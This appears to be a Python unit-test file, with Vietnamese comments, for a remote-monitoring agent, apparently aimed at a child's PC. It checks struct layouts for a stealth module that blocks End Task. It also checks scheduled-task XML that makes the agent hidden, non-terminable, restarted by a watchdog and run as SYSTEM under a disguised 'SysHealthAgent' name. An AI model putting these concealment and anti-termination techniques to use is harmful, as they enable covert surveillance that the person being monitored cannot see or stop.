# -*- coding: utf-8 -*-
"""Kiem chung nhung thu chi chay tren Windows nhung van xac minh duoc o may dev.

Hai nhom:
  1. Layout struct ctypes - sai offset/kich thuoc thi WinAPI doc nham bo nho
     (chan End Task that bai trong im lang, hoac lay sai PID cua tien trinh).
  2. XML scheduled task - sai mot the thi `schtasks /create` tu choi va
     toan bo buoc cai dat that bai.

Gia tri mong doi lay tu header MSVC (accapi.h, tlhelp32.h, sysinfoapi.h,
winuser.h), tinh cho ca x86 lan x64.
"""
from __future__ import annotations

import ctypes
import sys
import tempfile
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path

if str(Path(__file__).resolve().parents[1]) not in sys.path:
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from remotepc import installer
from remotepc.config import Config, StealthConfig
from remotepc.stealth import EXPLICIT_ACCESS_W, PROCESSENTRY32W, TRUSTEE_W
from remotepc.system_info import LASTINPUTINFO, MEMORYSTATUSEX

PTR = ctypes.sizeof(ctypes.c_void_p)           # 8 tren x64, 4 tren x86
X64 = PTR == 8
WCHAR = ctypes.sizeof(ctypes.c_wchar)           # 2 tren Windows, 4 tren Linux/macOS

NS = {"t": "http://schemas.microsoft.com/windows/2004/02/mit/task"}


def _text_of(root: ET.Element, path: str) -> str:
    node = root.find(path, NS)
    assert node is not None, f"thieu the {path}"
    return (node.text or "").strip()


def _cfg(display_name: str = "SysHealthAgent") -> Config:
    cfg = Config()
    cfg.data_dir = str(Path("C:/ProgramData") / display_name)
    cfg.stealth = StealthConfig(display_name=display_name,
                                description="Theo doi suc khoe he thong")
    return cfg


# --------------------------------------------------------------------------- #
# 1. Struct ctypes
# --------------------------------------------------------------------------- #


class TestStructLayouts(unittest.TestCase):
    """Kich thuoc/offset phai khop MSVC de WinAPI doc dung bo nho."""

    @staticmethod
    def _off(cls, field: str) -> int:
        return getattr(cls, field).offset

    @staticmethod
    def _sz(cls, field: str) -> int:
        return getattr(cls, field).size

    def test_trustee_w(self):
        self.assertEqual(ctypes.sizeof(TRUSTEE_W), 32 if X64 else 20)
        self.assertEqual(self._off(TRUSTEE_W, "pMultipleTrustee"), 0)
        self.assertEqual(self._sz(TRUSTEE_W, "pMultipleTrustee"), PTR)
        self.assertEqual(self._off(TRUSTEE_W, "MultipleTrusteeOperation"), PTR)
        self.assertEqual(self._off(TRUSTEE_W, "TrusteeForm"), PTR + 4)
        self.assertEqual(self._off(TRUSTEE_W, "TrusteeType"), PTR + 8)
        # ptstrName la con tro -> thang hang 8 byte tren x64 (co 4 byte padding)
        self.assertEqual(self._off(TRUSTEE_W, "ptstrName"), 24 if X64 else 16)
        self.assertEqual(self._sz(TRUSTEE_W, "ptstrName"), PTR)

    def test_explicit_access_w(self):
        """Sai layout o day = SetEntriesInAclW chan End Task that bai."""
        self.assertEqual(ctypes.sizeof(EXPLICIT_ACCESS_W), 48 if X64 else 32)
        for name, off in (("grfAccessPermissions", 0), ("grfAccessMode", 4),
                          ("grfInheritance", 8)):
            self.assertEqual(self._sz(EXPLICIT_ACCESS_W, name), 4, name)
            self.assertEqual(self._off(EXPLICIT_ACCESS_W, name), off, name)
        self.assertEqual(self._off(EXPLICIT_ACCESS_W, "Trustee"), 16 if X64 else 12)
        self.assertEqual(ctypes.alignment(EXPLICIT_ACCESS_W), PTR)

    def test_dword_width_is_explicit_not_platform_dependent(self):
        """c_ulong = 4 byte tren Windows (LLP64) nhung 8 byte tren Linux (LP64).

        Phai dung c_uint32 de struct giong het nhau o moi noi, neu khong thi
        khong the kiem chung layout bang test va de sai lech khi port.
        """
        self.assertEqual(ctypes.sizeof(ctypes.c_uint32), 4)
        field_type = EXPLICIT_ACCESS_W._fields_[1][1]      # grfAccessMode
        self.assertIs(field_type, ctypes.c_uint32,
                      "DWORD phai la c_uint32, khong phai c_ulong")
        if not sys.platform.startswith("win"):
            # Tren LP64 c_ulong rong bang con tro -> day chinh la ly do
            # khong duoc dung c_ulong cho cac truong DWORD.
            self.assertEqual(ctypes.sizeof(ctypes.c_ulong), PTR)

    def test_processentry32w(self):
        """Dung de tim PID cua tien trinh can bao ve - doc sai la bao ve that bai."""
        for name, off in (("dwSize", 0), ("cntUsage", 4), ("th32ProcessID", 8)):
            self.assertEqual(self._off(PROCESSENTRY32W, name), off, name)
            self.assertEqual(self._sz(PROCESSENTRY32W, name), 4, name)
        # th32DefaultHeapID la ULONG_PTR -> rong bang con tro, thang hang 8 tren x64
        self.assertEqual(self._sz(PROCESSENTRY32W, "th32DefaultHeapID"), PTR)
        self.assertEqual(self._off(PROCESSENTRY32W, "th32DefaultHeapID"), 16 if X64 else 12)
        self.assertEqual(self._off(PROCESSENTRY32W, "th32ModuleID"), 24 if X64 else 16)
        self.assertEqual(self._off(PROCESSENTRY32W, "th32ParentProcessID"),
                         32 if X64 else 24)
        self.assertEqual(self._off(PROCESSENTRY32W, "dwFlags"), 40 if X64 else 32)
        self.assertEqual(self._off(PROCESSENTRY32W, "szExeFile"), 44 if X64 else 36)
        self.assertEqual(self._sz(PROCESSENTRY32W, "szExeFile"), 260 * WCHAR)
        body = (44 if X64 else 36) + 260 * WCHAR
        self.assertEqual(ctypes.sizeof(PROCESSENTRY32W), -(-body // 8) * 8)

    def test_memorystatusex(self):
        self.assertEqual(ctypes.sizeof(MEMORYSTATUSEX), 64)
        self.assertEqual(self._sz(MEMORYSTATUSEX, "dwLength"), 4)
        self.assertEqual(self._sz(MEMORYSTATUSEX, "dwMemoryLoad"), 4)
        self.assertEqual(self._off(MEMORYSTATUSEX, "ullTotalPhys"), 8)
        for name in ("ullTotalPhys", "ullAvailPhys", "ullTotalPageFile",
                     "ullAvailPageFile", "ullTotalVirtual", "ullAvailVirtual",
                     "ullAvailExtendedVirtual"):
            self.assertEqual(self._sz(MEMORYSTATUSEX, name), 8, name)

    def test_lastinputinfo(self):
        """Dung tinh thoi gian con ngoi yen - sai thi canh bao idle nhay lung tung."""
        self.assertEqual(ctypes.sizeof(LASTINPUTINFO), 8)
        self.assertEqual(self._off(LASTINPUTINFO, "cbSize"), 0)
        self.assertEqual(self._off(LASTINPUTINFO, "dwTime"), 4)
        self.assertEqual(self._sz(LASTINPUTINFO, "dwTime"), 4)


# --------------------------------------------------------------------------- #
# 2. XML scheduled task
# --------------------------------------------------------------------------- #


class TestTaskXml(unittest.TestCase):
    def setUp(self):
        self.cfg = _cfg()
        self.root = Path("C:/ProgramData/SysHealthAgent")

    def _build(self, mode, trigger, principal):
        cmd, args, wd = installer.program_command(self.cfg, self.root, mode)
        xml = installer._task_xml(description=self.cfg.stealth.description,
                                  command=cmd, arguments=args, workdir=wd,
                                  trigger=trigger, principal=principal)
        return ET.fromstring(xml), xml

    def _text(self, root, path):
        node = root.find(path, NS)
        self.assertIsNotNone(node, f"thieu the {path}")
        return (node.text or "").strip()

    def test_all_four_tasks_are_wellformed_xml(self):
        """XML sai cu phap -> schtasks /create tu choi -> cai dat that bai."""
        specs = [
            ("run", installer.BOOT_TRIGGER, installer.SYSTEM_PRINCIPAL),
            ("uihost", installer.LOGON_TRIGGER, installer.USERS_PRINCIPAL),
            ("watchdog", installer.watchdog_trigger(), installer.SYSTEM_PRINCIPAL),
            ("notify", installer.event_trigger(installer.EVENT_1074_QUERY),
             installer.SYSTEM_PRINCIPAL),
        ]
        for mode, trigger, principal in specs:
            with self.subTest(mode=mode):
                root, raw = self._build(mode, trigger, principal)
                self.assertEqual(root.tag.split("}")[-1], "Task")
                self.assertIn('encoding="UTF-16"', raw,
                              "file duoc ghi UTF-16 nen khai bao phai khop")
                self.assertIsNotNone(root.find("t:Actions/t:Exec/t:Command", NS))

    def test_settings_carry_the_anti_endtask_flags(self):
        root, _ = self._build("run", installer.BOOT_TRIGGER, installer.SYSTEM_PRINCIPAL)
        self.assertEqual(self._text(root, "t:Settings/t:Hidden"), "true")
        self.assertEqual(self._text(root, "t:Settings/t:AllowHardTerminate"), "false")
        self.assertEqual(self._text(root, "t:Settings/t:ExecutionTimeLimit"), "PT0S")
        self.assertEqual(self._text(root, "t:Settings/t:Enabled"), "true")
        self.assertEqual(self._text(root, "t:Settings/t:StartWhenAvailable"), "true")
        self.assertEqual(
            self._text(root, "t:Settings/t:RestartOnFailure/t:Interval"), "PT1M")
        self.assertEqual(
            self._text(root, "t:Settings/t:RestartOnFailure/t:Count"), "999")
        self.assertEqual(self._text(root, "t:Settings/t:MultipleInstancesPolicy"),
                         "IgnoreNew")

    def test_guardian_runs_as_system_on_boot(self):
        root, _ = self._build("run", installer.BOOT_TRIGGER, installer.SYSTEM_PRINCIPAL)
        self.assertEqual(self._text(root, "t:Principals/t:Principal/t:UserId"),
                         "S-1-5-18")
        self.assertEqual(self._text(root, "t:Principals/t:Principal/t:RunLevel"),
                         "HighestAvailable")
        self.assertIsNotNone(root.find("t:Triggers/t:BootTrigger", NS))

    def test_uihost_runs_in_users_group_not_system(self):
        """UI host phai o session cua con; SYSTEM khong ve duoc len desktop."""
        root, _ = self._build("uihost", installer.LOGON_TRIGGER,
                              installer.USERS_PRINCIPAL)
        self.assertEqual(self._text(root, "t:Principals/t:Principal/t:GroupId"),
                         "S-1-5-32-545")
        self.assertIsNone(root.find("t:Principals/t:Principal/t:UserId", NS))
        self.assertIsNotNone(root.find("t:Triggers/t:LogonTrigger", NS))

    def test_watchdog_repeats_every_minute(self):
        root, _ = self._build("watchdog", installer.watchdog_trigger(),
                              installer.SYSTEM_PRINCIPAL)
        self.assertIsNotNone(root.find("t:Triggers/t:TimeTrigger", NS))
        self.assertEqual(
            self._text(root, "t:Triggers/t:TimeTrigger/t:Repetition/t:Interval"),
            "PT1M")

    def test_telemetry_listens_to_event_1074(self):
        root, _ = self._build("notify",
                              installer.event_trigger(installer.EVENT_1074_QUERY),
                              installer.SYSTEM_PRINCIPAL)
        self.assertIsNotNone(root.find("t:Triggers/t:EventTrigger", NS))
        sub = self._text(root, "t:Triggers/t:EventTrigger/t:Subscription")
        self.assertIn("<QueryList>", sub)
        self.assertIn('Path="System"', sub)
        self.assertIn("EventID=1074", sub)
        self.assertNotIn("&lt;", sub, "Subscription bi escape lan hai")

    def test_event_query_source_is_pre_escaped(self):
        self.assertIn("&lt;QueryList&gt;", installer.EVENT_1074_QUERY)

    def test_task_names_derive_from_display_name(self):
        names = installer.task_names(self.cfg)
        self.assertEqual(names["guardian"], "SysHealthAgent")
        self.assertEqual(names["uihost"], "SysHealthAgent UI")
        self.assertEqual(names["watchdog"], "SysHealthAgent Watchdog")
        self.assertEqual(names["telemetry"], "SysHealthAgent Telemetry")
        self.assertEqual(len(set(names.values())), 4, "bon task phai khac ten nhau")

    def test_xml_esc_helper(self):
        self.assertEqual(installer._xml_esc("a&b"), "a&amp;b")
        self.assertEqual(installer._xml_esc("<x>"), "&lt;x&gt;")
        self.assertEqual(installer._xml_esc('"q"'), "&quot;q&quot;")
        # dau nhay don khong can escape trong text node - giu nguyen
        self.assertEqual(installer._xml_esc("a'b"), "a'b")
        # thu tu replace quan trong: & phai di truoc, neu khong se escape lan hai
        self.assertEqual(installer._xml_esc("&lt;"), "&amp;lt;")

    def test_xml_special_chars_in_display_name_are_escaped(self):
        """Ten nguỵ trang chứa & < > " không được phá XML."""
        cfg = _cfg('Sys&Health<"Agent">')
        cmd, args, wd = installer.program_command(cfg, self.root, "run")
        xml = installer._task_xml(description='Mo ta & <dac biet> "x"',
                                  command=cmd, arguments=args, workdir=wd,
                                  trigger=installer.BOOT_TRIGGER,
                                  principal=installer.SYSTEM_PRINCIPAL)
        root = ET.fromstring(xml)          # khong escape -> ParseError
        self.assertIn("&amp;", xml)
        self.assertIn("&lt;", xml)
        self.assertEqual(self._text(root, "t:RegistrationInfo/t:Description"),
                         'Mo ta & <dac biet> "x"')
        self.assertIn('Sys&Health<"Agent">', cmd + args)


class TestTaskCommandPaths(unittest.TestCase):
    """Task phai tro dung cho, truyen dung --config, va quote duong dan co dau cach."""

    def setUp(self):
        self.cfg = _cfg()
        self.root = Path("C:/ProgramData/SysHealthAgent")

    def test_dev_mode_passes_config_and_subcommand(self):
        cmd, args, wd = installer.program_command(self.cfg, self.root, "run")
        self.assertIn("--config ", args)
        self.assertIn("C:/ProgramData/SysHealthAgent/config.json", args)
        self.assertEqual(wd, str(self.root / "bin"))
        self.assertTrue(cmd.endswith(".exe") or "python" in Path(cmd).name.lower(), cmd)

    def test_each_mode_maps_to_its_subcommand(self):
        for mode, sub in (("run", "run"), ("uihost", "uihost"),
                          ("watchdog", "watchdog"), ("notify", "notify-shutdown")):
            with self.subTest(mode=mode):
                _c, args, _w = installer.program_command(self.cfg, self.root, mode)
                self.assertTrue(args.rstrip().endswith(sub), f"{mode} -> {args}")

    def test_mode_arg_mapping(self):
        self.assertEqual(installer.mode_arg("notify"), "notify-shutdown")
        self.assertEqual(installer.mode_arg("run"), "run")
        self.assertEqual(installer.mode_arg("uihost"), "uihost")
        self.assertEqual(installer.mode_arg("watchdog"), "watchdog")

    def test_data_dir_with_spaces_is_quoted(self):
        cfg = _cfg("Sys Health Agent")
        _c, args, _w = installer.program_command(cfg, self.root, "run")
        self.assertRegex(args, r'--config "C:/ProgramData/Sys Health Agent/config\.json"')
        xml = installer._task_xml(description="d", command="py", arguments=args,
                                  workdir="w", trigger=installer.BOOT_TRIGGER,
                                  principal=installer.SYSTEM_PRINCIPAL)
        got = ET.fromstring(xml).find("t:Actions/t:Exec/t:Arguments", NS)
        self.assertIn("Sys Health Agent", (got.text or ""))

    def test_frozen_mode_points_at_installed_bin(self):
        """Bug da gap: task tro vao thu muc build cua PyInstaller thay vi bin\\ da cai."""
        from unittest import mock

        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            dist = tmp / "dist"
            (dist).mkdir()
            fake_exe = dist / "SysHealthAgent.exe"
            fake_exe.write_bytes(b"x")
            install_root = tmp / "install"
            (install_root / "bin").mkdir(parents=True)
            installed = install_root / "bin" / "SysHealthAgent.exe"
            installed.write_bytes(b"x")

            with mock.patch.object(installer, "is_frozen", return_value=True), \
                 mock.patch.object(sys, "executable", str(fake_exe)):
                cmd, args, wd = installer.program_command(self.cfg, install_root, "run")

            self.assertEqual(cmd, str(installed))
            self.assertEqual(wd, str(install_root / "bin"))
            self.assertTrue(args.startswith("--config "), args)
            self.assertTrue(args.rstrip().endswith("run"), args)

    def test_frozen_uihost_points_at_bin_ui(self):
        from unittest import mock

        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            (tmp / "dist").mkdir()
            fake_exe = tmp / "dist" / "SysHealthAgent.exe"
            fake_exe.write_bytes(b"x")
            install_root = tmp / "install"
            ui_dir = install_root / "bin" / "ui"
            ui_dir.mkdir(parents=True)
            ui_exe = ui_dir / (self.cfg.stealth.uihost_name + ".exe")
            ui_exe.write_bytes(b"x")

            with mock.patch.object(installer, "is_frozen", return_value=True), \
                 mock.patch.object(sys, "executable", str(fake_exe)):
                cmd, args, wd = installer.program_command(self.cfg, install_root,
                                                          "uihost")

            self.assertEqual(cmd, str(ui_exe))
            self.assertEqual(wd, str(ui_dir))
            self.assertEqual(args.strip(), args)
            self.assertFalse(args.rstrip().endswith("uihost"),
                             "exe rieng cua uihost khong can them subcommand")

    def test_frozen_install_root_with_spaces_survives_xml(self):
        from unittest import mock

        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            (tmp / "dist").mkdir()
            fake_exe = tmp / "dist" / "SysHealthAgent.exe"
            fake_exe.write_bytes(b"x")
            install_root = tmp / "My Programs" / "install"
            (install_root / "bin").mkdir(parents=True)
            installed = install_root / "bin" / "SysHealthAgent.exe"
            installed.write_bytes(b"x")

            with mock.patch.object(installer, "is_frozen", return_value=True), \
                 mock.patch.object(sys, "executable", str(fake_exe)):
                cmd, args, wd = installer.program_command(self.cfg, install_root, "run")

            self.assertIn("My Programs", cmd)
            xml = installer._task_xml(description="d", command=cmd, arguments=args,
                                      workdir=wd, trigger=installer.BOOT_TRIGGER,
                                      principal=installer.SYSTEM_PRINCIPAL)
            root = ET.fromstring(xml)
            self.assertEqual(_text_of(root, "t:Actions/t:Exec/t:Command"), cmd)
            self.assertEqual(_text_of(root, "t:Actions/t:Exec/t:WorkingDirectory"), wd)


if __name__ == "__main__":
    unittest.main(verbosity=2)
